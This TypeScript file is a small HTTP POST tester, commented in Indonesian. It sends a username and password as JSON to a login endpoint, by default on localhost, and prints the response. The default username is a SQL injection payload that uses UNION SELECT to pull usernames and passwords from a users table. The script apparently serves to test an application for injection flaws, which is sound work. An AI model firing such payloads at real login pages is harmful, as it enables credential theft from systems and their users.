// test-post.ts

const colors = {
   reset: "\x1b[0m",
   bright: "\x1b[1m",
   dim: "\x1b[2m",
   cyan: "\x1b[36m",
   green: "\x1b[32m",
   yellow: "\x1b[33m",
   red: "\x1b[31m",
   magenta: "\x1b[35m",
   blue: "\x1b[34m",
};

const targetUrl = process.argv[2] || "http://localhost:3000/api/login";
const username =
   process.argv[3] || "' UNION SELECT 1, username, password FROM users #";
const password = process.argv[4] || "";

// Pastikan URL memiliki protokol http:// jika belum ada
const fullUrl = targetUrl.startsWith("http")
   ? targetUrl
   : `http://${targetUrl}`;

const payload = {
   username: username,
   password: password,
};

console.log(
   `${colors.cyan}========================================${colors.reset}`
);
console.log(
   `${colors.bright}${colors.magenta}       HTTP POST Request Tester         ${colors.reset}`
);
console.log(
   `${colors.cyan}========================================${colors.reset}`
);
console.log(
   `${colors.yellow}Target URL${colors.reset} : ${colors.bright}${fullUrl}${colors.reset}`
);
console.log(
   `${colors.yellow}Method    ${colors.reset} : ${colors.green}POST${colors.reset}`
);
console.log(
   `${colors.yellow}Header    ${colors.reset} : Content-Type: application/json`
);
console.log(
   `${colors.yellow}Payload   ${colors.reset} :\n${colors.dim}${JSON.stringify(
      payload,
      null,
      2
   )}${colors.reset}`
);
console.log(`\n${colors.cyan}Mengirim request...${colors.reset}\n`);

async function sendRequest() {
   const startTime = performance.now();

   try {
      const response = await fetch(fullUrl, {
         method: "POST",
         headers: {
            "Content-Type": "application/json",
         },
         body: JSON.stringify(payload),
      });

      const elapsed = Math.round(performance.now() - startTime);
      const statusColor = response.ok ? colors.green : colors.red;

      console.log(
         `${colors.bright}[Status Respon]${colors.reset} : ${statusColor}${response.status} ${response.statusText}${colors.reset} (${elapsed}ms)`
      );

      const contentType = response.headers.get("content-type") || "";
      if (contentType.includes("application/json")) {
         const data = await response.json();
         console.log(
            `${colors.bright}[Body Respon]  :${colors.reset}\n${
               colors.green
            }${JSON.stringify(data, null, 2)}${colors.reset}`
         );
      } else {
         const text = await response.text();
         console.log(
            `${colors.bright}[Body Respon]  :${colors.reset}\n${text}`
         );
      }
   } catch (error: any) {
      console.error(
         `${colors.red}[Error] Gagal mengirim request:${colors.reset}`,
         error.message
      );
   }
}

sendRequest();
